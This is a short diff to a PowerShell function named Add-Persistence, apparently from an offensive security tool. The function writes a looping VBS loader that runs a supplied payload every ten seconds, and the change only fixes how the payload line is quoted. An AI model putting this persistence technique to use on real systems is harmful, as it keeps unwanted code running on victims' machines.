@@ -50,8 +50,8 @@ function Add-Persistence()
 	Write-Host "[+] Creating VBS loader."
 	$vbs = "Do`r`n"
 	$vbs += "Set oShell = CreateObject( ""WScript.Shell"" )`r`n"
-	$vbs += "$payload""`r`n"
-	$vbs += "WScript.Sleep 10000`r`n"
+	$vbs += "$payload"
+	$vbs += "`r`nWScript.Sleep 10000`r`n"
 	$vbs += "Loop"
 	$vbs | Out-File $payloadvbsloaderpath -Force
 	
